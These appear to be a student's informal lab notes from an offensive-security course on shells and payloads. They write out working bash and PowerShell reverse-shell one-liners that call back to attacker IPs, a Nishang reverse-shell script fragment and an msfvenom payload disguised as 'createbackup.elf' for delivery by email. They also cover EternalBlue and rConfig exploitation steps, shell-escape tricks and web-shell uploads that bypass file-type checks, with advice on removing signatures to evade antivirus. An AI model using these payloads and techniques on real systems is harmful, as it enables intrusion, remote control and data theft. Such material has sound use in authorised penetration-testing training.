Shell Jack Us In, Payloads Deliver Us shells
./followthegreencube.sh
-Shell is a program that provides a comp user with an interface to input instruction int the sys and view text out put (Bash, Zsh, cmd, and Powershell,..)
-a shell is often the result of exploiting a vul or bypassing security measures to gain interactive access to a host. we may have heard or read the following phrase used by people discusing an engagement or a recent practice sessiong
-remote shell = success pentest this is outcome after enumeration and identification of promissing exploits
\\Why Get a Shell?
-the shell gives us direct access to the OS, system commands, and file system, if we gain access we can start enum the system for vectors that may allow us to escalate privileges, pivot, transfer files, ....
-establishing a shell also allows us to maintain persistence on the sys, give us more time to work, it can make it easier to use our atk tools exfiltrate data, gather, store and doc all the details of our atk.
-shell is more invisible than VNC, RDP harder to detect than graphical shells, faster to navigate the OS, and easier to automate our actions
Perspective	Description
Computing	The text-based userland environment that is utilized to administer tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and PowerShell.
Exploitation & Security	A shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. An example would be triggering EternalBlue on a Windows host to gain access to the cmd-prompt on a host remotely.
Web	This is a bit different. A web shell is much like a standard shell, except it exploits a vulnerability (often the ability to upload a file or script) that provides the attacker with a way to issue instructions, read and access files, and potentially perform destructive actions to the underlying host. Control of the web shell is often done by calling the script within a browser window.
\\Payloads Deliver us Shells.

Within the IT industry as a whole, a payload can be defined in a few different ways:

Networking: The encapsulated data portion of a packet traversing modern computer networks.
Basic Computing: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
Programming: The data portion referenced or carried by the programming language instruction.
Exploitation & Security: A payload is code crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.

\\Spotting a Shell or Payload 
$env $ps
\\===========================
Bind Shells
target sys has a listenter and awaits a connection
\\Practicing with GNU Netcat
\\1 Server - Target starting Netcat listener
$nc -lvnp 7777  -> waiting for client to connect
\\2 client - connect to target
$nc -nv 10.129.41.200 7777
\\3 Server - Target receiving connection from client
$nc -lvnp 7777
that is not proper shell. it just a Netcat TCP session established.
\\4 Client- Attack box sending message hello academy
$nc -nv 10.129.41.200 7777
\\5 Server - Target receiving Hello Academy message
$nc -lvnp 7777
NOTE: when on the academy network (10.129.x.x/16) we can work with another academy student to conn to their target box and pratice the concepts presentad in this module
\\Establishing a Basic Bind Shell with Netcat
Netcat not actual shell it only TCP session, only able to pass text within the pipe setup by netcat. let use Netcat to serve up our shell to establish a real bind shell
-on svr site we will need to specify the dir, shell, listener, work with some pipelines, and input & output redirectin. to ensure a shell to sys get served when the client attemps to conn
\\1. Server- Binding a Bash shell to the TCP session
$rm -f /tmp/f; mkfifo /tmp/f; cat/tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f 
this diff depend on OS
\\2 Client - conn to bind shell on target
$nc -nv 10.129.41.200 7777
\\======================================
Reverse Shells
-the atk box will have a listener running and target will need to initiate the conn
exploit some vuls like unrestricted file upload, command injection,etc,..) to force the target to initiate a conn with our target box, effectively meaning our atk box becomes the server and the target becomes the client
-utilize payload reverse at:

Introduction to Payloads
\\have you ever sent an email or text to someone?
-in information security the payload is the command and/or code that exploit the vul in an OS and/or application.
-the payload is the command and/or code that performs the malicious action from a defensive per,
-when deliver and execute payloads, just like any other program, we give the target comp instructions on what it need to do. 
-the terms "malware" and " malicious code" romanticzie the process and make it more mysterious than it is/
\\One-Liners Examined
\\Netcat/Bash Reverse Shell One-liner
$rm -f /tmp/f; mkinfo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f 
common one-liner issued on a linux system to serve a Bash shell on a network socket utilizing a Netcat listener.
\\Remove /tmp/F
rm -f /tmp/f;
removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequently
\\MAke A Named Pipe
$mkfifo /tmp/f 
-Make a https://man7.org/linux/man-pages/man7/fifo.7.html at the location specified, /tmp/f is the FIFO named pipe file, the semi-colon(;) is used to execute the command sequently
\\Output redirection
$cat /tmp/f |
-Concatenates the FIFO named pipe file /tmp/f, the pipe (|) conn the standard output of cat /tmp/f to te standard input of the commnd that comes after the pipe (|)
\\Set Shell options
$/bin/bash -i 2>&1 | 
Specifies the cmd language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2)& standard output data stream (1) are redirected to the cmd following the pipe ([])
\\Open a Connection with Netcat
$nc 10.10.14.12 7777 > /tmp/f 
-Uses Netcat to send a conn to atk host port, the output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner cmd is executed
\\PowerShell One-Liner Explained

$powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
\\Calling PowerShell
PS> powershell -nop -c 
-execute Ps with no profile (nop) and executes the cmd/script block (-c) contained in the quotes.this particular cmd is issued inside of command-prompt, 
\\Binding A socket
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
-Set/eval the variable $client equal to (=) the Net-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will conn with the TCP socket listed in the parentheses (10.10.14.158,443) the semi-colon(;) ensure the cmd & code are executed sequently
\\Setting the command stream
$stream = $client.GetStream();
Set/evaluates the var $stream equal to (=) $client var and the .NET fram method called Get Stream that faciliate network comm, the semi-colon(;) ensures the cmd & code are executed sequentially
\\Empty Byte Stream
[byte[]]$byte = 0..65535|%{0};
-Create a byte type array([]) called $bytes that returns 65,535 zeros as the values in the array. this is essentially an empty byte stream that will be directed to the TCP listener on an atk box await for conn
\\Stream Parameters
$while(($i = $stream.Read($byte, 0, $bytes.Length)) -ne 0)
-Start a while loop containing the $i var set equal to (=) the .Net fram Stream.Read($stream.Read) method
the parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parenthesses of the method
\\Set The Bytes encoding
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)};
set/eva the var $data (=) an ASCII encoding .NET frame class that will be used in conjunc GetString method to encode the byte stream ($bytes) into ASCII
\\Invoke-Expression
$sendback = (iex $data 2>&1 | Out-String );
-Set/eva the var $senback (=) invoke-expression (iex) cmdlet the $data var, 
then redirects the standard error (2>)& standard output through a pipe (|) to the Out-String cmdlet which coverts input object into strings
\\Show Working directory
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
-Set/eva the var $sendback2 (=) the $sendback var (+) the string PS('PS') + path to the working dir ((pwd).path) + the string '> ' 
>> this will result in the shell prompt being PS C:\workingdirectoryofmachine >.
\\Sets sendbyte
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
$sendbyte = ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat Listener 
\\Tarminate TCP connection
$client.Close()"      >> TCP close method will be used when the conn is terminated
Script/ps1
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.

$msf>use 56   >> msf6 exploit(Windows/smb/psexec)>
\\Examining an Exploit options
$msf> options
-notice how this particular exploit will use a reverse TCP shell conn utilizing Meterpreter. A meterpreter shell give us far more func than a raw TCP reverse shell,
\\Setting options
$msf>set RHOSTS 10.129.180.71
$msf>set SHARE ADMIN$
$msf>set SMBPass HTB_@cademy_stdnt!
$msf>set SMBUser htb-student
$msf>set LHOST 10.10.14.222
-these settings will ensure that our payload is delivered to the proper target (RHOSTS), uploaded to the default administrative share (ADMIN$)
utilizing cred (SMBPass & SMBUser) then initiate a reverse shell conn with our local host machine (LHOST)
-these settings will be specific to the IP addr on atk box. aws with ced. we can set the LHOST (local host) VPN tunnel IP addr or the VPN tunnel interface Ideals
\\Explits Away

\\\\\\\\\\\\\\\\\=========================
Crafting Payloads with MSFvenom
-using automated atks in matasploit requires us to reach a vulnerable target machine over the network. 
run the exploit module, deliver the payload, and establish the shell session, we need comm with the system in the 1st (internal atk)
-in almost case we dont have reach internal network -> crafty in how the payload get delivered and executed on the sys. one such way may be to use MSFvenom to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file
-in addtion to providing a payload with flexible delivery options, MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus detection signatures.
\\Practicing with MSFvenom
$msfvenom -l payload to list all the available payload
\\Staged vs. Stageless Payloads
-staged create a way for us to send over more components of our atk. it like "setting the stage"  EX linux/x86/shell/reverse_tcp when run using an exploit module in msf. ths payload will send a small stage that will be exec on the target and then call back to the atk box to download the remainder of the payload over the network.
-> then execute the shellcode to establish a reverse shell. (stage take some memory which leave less space for the payload) what happen at each stage could vary depending on the payload
-stageless payload do not have a stage, take for ex linux/zarch/meterpreter_reverse_tcp
->run it in exploit MSF this will sent in its entirely across a network conn without a stage.this could benefit us in environments where we do not have access to much bandwidt and latency can interfere. staged payload could lead to unstable shell sessions.
->best to select a stageless payload. sometimes it be better for evasion purpose dueto less traffic passing over the network to exec the payload, especially if we deliver it by employing social engineering. 
-This conceptis also very well explained by Rapid 7 in this blog spothttps://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/
-there naming convension betw staged and stageless payload
\\Building A Stageless Payload
$msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
\\call MSFvenom
$msfvenom  >defines the tool used to make the payload
\\Creating a Payload
-p  > this option indicates that msfvenom is creating a payload
\\Choosing the Payload based on Architecture
$linux/x64/shell_reverse_tcp   > specifies a linux 64-bit stageless payload that will initiate a TCP-based reverse shell (shell_reverse_tcp)
\\Address to Connect Back to
LHOST=10.10.14.113 LPORT=443
when exec the payload will call back to the specified IP addr 10.10.14.113 on the specified port (443)
\\Format To Generate Payload In
-f elf    > the flag -f specifies the format the generated binary will be in. 
\\Output  >  createbackup.elf
\\Executing a Stageless Payload
- email message with the file attached
-Download link on a web
-combined with a metasploit exploit module (require internal network)
-via flash drive as part of an onsite pentest
-> we would have a listener ready to catch the conn on the atk box side upon successful exec
\\NC Connection
$sudo nc -lvnp 443       > when the file is exec we will caught a Shell\
\\Connection established

\\EX Compromise Walkthrough
\\Enum the host
$nmap -v -A 10.129.201.97
analyze result and refer to smt like MS17-010(eternalblue), IIS service, and SMB 
-> validate it with MSF auxiliary/scanner/smb/smb_ms17_010
2. search for and decide on an exploit path
$msfconsole > search eternalblue.
$use auxiliary/scanner/smb/smb_ms17_010  > show options > set RHOST 10.129.201.97 > run
<r> found out target vul with eternalblue let setup the exploit and payload
3. select exploit & payload then deliver
\\Choose & configure Our exploit & payload
msf> search eternalblue
\\configure the Exploit & Payload
msf>use 2 > options ensuer RHOSTS, LHOST, and LPORT field required
-kept it simple and just used a windows/meterpreter/reverse_tcp payload. use this for diff shell type or obfuscate atk more/
4. Execute Attack, and Receive A CAllback
\\Execute Our Attack
msf>exploit   meterpreter>getuid
sucess -> utilize meterpreter shell to run further commands
5. Identify the Native Shell
\\Identify Our Shell 
meterpreter > shell 
\\CMD-Prompt and Power[Shell]s for fun and profit
CMD deals with text input and output and doean't keep record command used, not effect by Execution Policy , and User Account Control (UAC)
PowerShell utilize .NET object for all input and out put.
Use CMD when:

You are on an older host that may not include PowerShell.
When you only require simple interactions/access to the host.
When you plan to use simple batch files, net commands, or MS-DOS native tools.
When you believe that execution policies may affect your ability to run scripts or other actions on the host.
Use PowerShell when:

You are planning to utilize cmdlets or other custom-built scripts.
When you wish to interact with .NET objects instead of text output.
When being stealthy is of lesser concern.
If you are planning to interact with cloud-based services and hosts.
If your scripts set and use Aliases.
\\WSL and Powershell for Linux
there malwares tha utilize Python3 and Linux bin to download install payload lib that are native to both window and linux WSL
- any network request or functions executed to or from WSL instance are not parsed by Windows Firewall and Window Defender, making it a bit of a blind spot on the host
-same issues found via PowerShell Core which can be installed on Linux operating system 
hacker aim to use these features to avoid AV and EDR detection mechanism

Infiltrating Unix/Linux
\\Common considerations 
benefit from considering the 
 What distribution of Linux is the system running?
What shell & programming languages exist on the system?
What function is the system serving for the network environment it is on?
What application is the system hosting?
Are there any known vulnerabilities?
\\Ganining a Shell Through Attacking a Vulnerable application
$nmap -sC -sV 10.129.201.101
> let get gaining a shell session 
get some infor like listening on ports 80, 443, 3306 (MySQl, 21 (Ftp)) it may be safe to assume that this is a web svr hosting a web app.
some version web stack apache 2.4.6 and PHP 7.2.34 and distribution of linux running on the sys (CentOS) 
> let check the IP on web browser due to it show a web stack there
rConfig management tools from the IP > a app used by network & system admin to automate the process of configurating network app.
ex it use case would remotely configure network interface with IP addressing infr on mutiple router simul 
=> once it atked all network infra will ruins
\\Discovering a Vulnerability in rConfig
> looking for its verrsion > rConfig (3.9.6) > use this infor start looking for any CVEs, Publicly available exploits and proof of concepts(PoCs)
ex: exploit DB, rapid 7
\\Search for an Exploit Module 
$msf> search rConfig
NOTE: use some search on Rapid 7 or git hub like rConfig 3.9.6 exploit metasploit github
> search result rconfig_vendors_auth_file_upload_rce.rb > this can get us a shell on linux runing rconfig_vendors_auth_file_upload_rce but no module on MSF search
we can copy the code from this repo onto our local atk box and save it in the dir that our local install of MSF is refer,
$locate exploits
/usr/share/metasploit-framwork/modules/exploits/linux/http <copy the code here>
\\keep the msf upload to Date 
$apt update; apt install metasploit-framwork or package manager
\\wget or copy local anway local need file extension .rb all module MSF are in ruby
\\Using the rConfig Exploit and Ganining a Shell
$msf> use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
>options and input the proper setting specific network infor and lauch exploit
We can see from the steps outlined in the exploitation process that this exploit:

Checks for the vulnerable version of rConfig
Authenticates with the rConfig web login
Uploads a PHP-based payload for a reverse shell connection
Deletes the payload
Leaves us with a Meterpreter shell session
\\Interact with the shell
meterpreter> shell <we can drop into system shell to gain access to the target system as if we were logged in and open a terminal
\\spawning a TTY Shell iwth PYthon 
the default shell may be refer as non-tty shell limited func and can often prevent use of essential cmd like su and sudo
> this because the payload was executed on the target by the apache user.
>we can manually spawn a TTY shell using python if it presentad
\\Interactive Python3
$python -c 'import pty; pty.spawn("/bin/sh")'
Whoami
this command use python to import the pty module then uses the pty.spawn function to execute the bourne shell 
binary(/bin/sh) we now have a prompt (sh-4.2$) and access to more sys command to move about the system as we please
$sudo nmap -A -Pn <target>  > it show 80 443 mean it's an web ser
$msfconsole -q  > set RHOSTS <target>  >  set LHOST <atk>  >  set SRVHOST <atk> > exploit
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
$cd /devicedetails  > cat hostnameinfor.txt
\\\\=======================================
spawning Interactive Shells
with most linux we will get bourne shell (/bin/sh) and bourne again shell (/bin/bash)
\\/bin/sh -ideals
$/bin/sh -i  > this command will execute the shell interpreter specified in the path in interactive mode (-i)
\\Perl to Shell 
$perl -e 'exec "/bin/sh";'
$perl: exec "/bin/sh";  the script should be run from a script
\\ruby
$ruby: exec "/bin/sh"  this command will execute the shell interpreter specified this should be run from a script
\\lua 
$lua: os.execute('/bin/sh')
\\AWK  C-like pattern scanning and process present on most UNIX/linux,widely used by dev and sysope to generate report/
$awk 'BEGIN {system("/bin/sh")}'
\\find
$find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
it will searching for any file listed after the -name then executes awk script
\\Using Exec to Launch a Shell
$find . -exec /bin/sh \; -quit
this use of find and execute option (-exec) to iniatiate the shell interpreter directly. if find can;t find the specified file then no shell will be AuthenticationMethods
\\Vim
$vim -c ':!/bin/sh'
Vim escape
$vim 
:set shell=/bin/sh
:shell
\\Execution Permissions considerations
Permission 
$ls -la <path/to/fileorbinary>
\\Sudo -l

Introduction to Web Shell
-as external pentest we ussually found (file upload atk, SQL injection, RFI/LFI, Command injection,etc,...)
-password spraying (against RDS, VPN portals, Citrix, OWA, and other app using AD authentication and social engineering)
-web app are often majority of what we see exposed during an external network assess and often present an anormous atk surface.
- we may found publicly avail file upload from that let us directly upload a PHP, JSP, or ASP.NET web shell
EX upload photo we can across app such as Tomcat, Axis2, or WebLogic, which allow us to deloy JSP code via a WAR file as part of theri func,
we may even find a misconfig FTP service that allows file upload directly to the server webroot.
\\Webshell
is a browser-based shell session we can use to interact with the underlying oS of a web svr.
-to gain remote code execution via web shell.we must find a website or web app vulnerability that can give us file upload capabilities, 
-most web shells are gained by uploading a payload in a web language on the target svr. the payload(s) we upload should give us remote code execution capability within the browser.
-payload web shell are temporary try to remote code execution via web app which give more interactive reverse shell
\\Laudanum, One Webshell to rule Them All
this is a repository of ready-made files that can be used to inject onto a victim and receive back access via reverse shell run commands on the victim host right from the browser, and more.
-the repo includes injectable files for many diff web app language to include asp, aspx, jsp, php,... 
-laudanum is built into Parrot OS and Kali by default. for any other distro, we need to pull a copy down to use 
https://github.com/jbarcia/Web-Shells/tree/master/laudanum
\\Working with Laudanum
the Laudanum files can be found in the /usr/share/laudanum directory.most file in folder can be copy where we need them on the victim to run.
-for specific files such as shells, we must edit the file first to insert your atking host IP addr to ensure we can access the web shell or receive a callback in the instance that we use a reverse shell.
-be sure to read the contents and comments ato ensure take proper actions
\\Laudanum Demonstration
try to copy shell to target box entry /etc/hosts that entry should read <target ip>status/inlanefreight.local once this done we can play and explore this demonstration as long as we are on the VPN or using atkbox
\\Move a Copy for Modifications
$cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
-add IP addr to the allowedIps variable on line 59. these item in a payload are often signatured on and can alert the defenders/AV to what we're doing
\\Modify the Shell for Use
try to upload file if successfuly it should print out the path to where the file was saved
>navigate to web shell to utilize its functions. almost the filenames will come in randomize 
-with particular web app our file went to status.inlanefreight.local\\files\demo.aspx and will require us to browse for the upload by using that \ in the path instead of the / like normal.
once do this, browser will clean it up in URL window to appear as status.inlanefreight.local//files/demo.aspx
\\Navigate to Our Shell
status.inlanefreight.local//files/demo.aspx
we can now utilize the laudanum to issue commands to the host.
<test>Establish a web shell session with the target using the concepts covered in this section. 
Submit the full path of the directory you land in. (Format: c:\path\you\land\in)
$sudo bash -c 'echo "IP status.inlanefreight.local" >> /etc/hosts'
cp /usr/share/laudanum/aspx/shell.aspx ./
vim to modify row 59 to atk ip
>>visit web  >>upload shell >> once upload it show a path >> navigate the path and submit the query with Dir command

<test>Where is the Laudanum aspx web shell located on Pwnbox? 
Submit the full path. (Format: /path/to/laudanum/aspx)
ls /usr/share/laudanum/aspx/

AnTak Webshell
\\ASPX and a Quick Learning Transcript
https://ippsec.rocks/?#

ASPX Explained
Active Server Page Extended (ASPX) is a file type/extension written for Microsoft ASP.NET Framework. on a web server running the ASP.Net Framwork, web form pages can be generated for users to input data
-on svr side the infor will be converted into HTML we can take advantage of this by using an ASPX-based web shell to control the underlying Windows OS, let witness this first-hand by utilizing the Antak Webshell
\\Antak Webshell
is a Web shell built in ASP.Net included within the Nishang project. Nishang is an Offensive Powershell toolset that can provide options for any portion of your pentest.
https://github.com/samratashok/nishang
since we focus on web app keep an eye on Antak. it utilizes Powershell to interact with the host. making it great for acquiring a webshell on a windows svr. the UI is even themed like Powershell. it's time to dive in and experiment with Antak
\\Working with Antak
the Antak files can be found in the /usr/share/nishang/Antak-WebShell directory
$ls /usr/share/nishang/Antak-WebShell
-Antak web shell func like a PowerShell console. hower, it will execute each command as a new process. it can also execute scripts in memory and encode commands . as a webshell, antak is a pretty powerful tool
\\Antak Demonstration
we need entry into our /etc/hosts file on atk VM or Within pwnbox for the host we are attacking. that entry should read <target ip> status.inlanefreight.local once this done, as long as we are on the VPN or using pwnbox.
\\Move a Copy for Modification 
$cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
-maker sure set credentials for access to the web shell. modify line 14.set user pwd -> this help make your operations more secure by ensuring random people 
can;t just stumble into using the shell, it can be prudent to remove the ASCII art and comments from the file. these items in a payload are often signatured on and can alert the defenders/AV 
-uploading the same status portal in laudanum. that host was a windows host, so shell should work just fine with Powershell, upload the file and then naviagate to the page for user it will give us a user and password prompt.
-remember with web app the files are stored in the \\files\ dir/ when navigate upload.aspx file we should see a prompt
-we can upload and download files, encode and execute script,... we also can upload funcs or use a Powershell online to download and execute the shell

<test>Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)
/usr/share/nishang/Antak-WebShell/antak.aspx
<test>Establish a web shell with the target using the concepts covered in this section
. Submit the name of the user on the target that the commands are being issued as. 
In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: ****\****, 1 space)
$sudo bash -c 'echo "IP status.inlanefreight.local" >> /etc/hosts'
$cp /usr/share/nishang/Antak-WebShell/antak.aspx
$modify file antak.aspx line 14
>>uplod file to web status... Uploaded Configuration File Name: C:\inetpub\wwwroot\status.inlanefreight.local\files\antak.aspx
$whoami

PHP Web Shells
Hypertext Preprocessor or PHP is an Open-source general-purpose scripting language typically used as part of a web stack that powers a website. PHP is the most popular server-side programing languag
\\PHP Login Page 
https://<ip>/login.php
-knowing a web server is using PHP gives us pentester a clue that we may gain a PHP-based web shell on this system.
\\Hands-on With a PHP-Based Web Shell
-PHP process code & commands on server-side, we can use pre-payload to gain a shell through the brower or initiate a reverse shell session with our atk box.
-take avantage of vul rconfig to manually upload a PHP web shell and interact with the underlying Linux host.rconfig allow admins to add network devices and categorize by vendor 
-using: https://github.com/WhiteWinterWolf/wwwolf-php-webshell >>download an paste source code into a .php file. 
our goal is to upload the PHP web shell via the Vendor Logo browse button. attempting to do this initailly will fail since rConfig is checking for the file type. it allow some file type (.png.jpg.gid.etc) we can by pass using burp
>>start burp >> browser network setting menu and fill out the proxy setting 127.0.0.1 will go in the IP addr field. and 8080 wll go in the port field to ensure all requests pass through burp (recall that burp acts as the web proxy)
\\proxy setting
>> change the content-type to bypass the file type restriction in uploading files to be "presented" as the vendor logo so we can naviagate to that file and have our web shell
NOTE firefox remove FTP support starting with version 90
\\Bypassing the file type restriction
upload the file>>browse button >>navigate wherever .php file is stored on atk box. and select save (we may need to accept the portswigger cert) forward requests until you see the POST request containing file upload
\\Post Request
>>change content-type from application/x-php to image/gif. forward twice>> go back to the browser
>>message added file >> attempt to use our web shell. using browser navigate to this dir on the rConfig svr
/images/vendor/connect.php
this execute the payload an provide us with a non-interactive shell ession entirely in the browser. allowing us to execute commands on the underlying OS
\\Webshell success
\\Considerations when Dealing with Web Shells
When utilizing web shells, consider the below potential issues that may arise during your penetration testing process:

Web applications sometimes automatically delete files after a pre-defined period
Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. whoami && hostname), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
Greater chance of leaving behind proof that we were successful in our attack
->depend on the engagement we need to attempt to go undetected and cover our track.
document every method we attempts, that worked & what not work name of the payload & files we tried. could include a sha1sum or MD5 hash of the file name. upload locations in our reports as proof and provide attribution
